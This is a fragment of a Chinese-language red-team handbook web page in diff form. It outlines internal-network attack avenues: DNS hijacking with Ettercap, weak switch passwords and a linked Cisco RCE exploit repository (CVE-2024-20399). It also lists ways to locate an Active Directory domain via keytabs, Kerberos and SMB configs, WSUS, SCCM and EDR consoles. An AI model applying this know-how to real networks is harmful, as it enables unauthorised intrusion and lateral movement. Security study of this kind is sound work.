+<li><strong>关键网络设施/网关/DNS/设备弱口令</strong>: DNS劫持(甲方蓝军/国际酒店/Ettercap|HTTP) / Switch弱口令(cirtx) / <a href="https://github.com/Blootus/CVE-2024-20399-Cisco-RCE">CVE-2024-20399 Cisco RCE</a></li>
+<li>爆破域名</li>
+</ul>
+<h3 id="_9">找域</h3>
+<ul>
+<li><a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></li>
+<li>resolv.conf(DNS) / /etc/krb5.conf / smb.conf / cifs挂载 / 找NAS / 找AD验证web服务 / 源码+服务器配置文件</li>
+<li>找VDI(常见的域信息收集命令，涉及请求与空服务器的都不要用) / 找WSUS / 找SCCM / 找EDR管控终端</li>
+<li>查看网络连接: 139(双网卡) / 445 / 389 / 636</li>
+<li>GitLab等...</li>
+</ul>
+<h3 id="tv">TV/向日葵</h3>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../ch-04/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 4. 代码审计">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                4. 代码审计
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../ch-06/" class="md-footer__link md-footer__link--next" aria-label="Next: 6. 服务器及个人PC信息收集">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                6. 服务器及个人PC信息收集
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top", "navigation.tracking", "navigation.footer", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
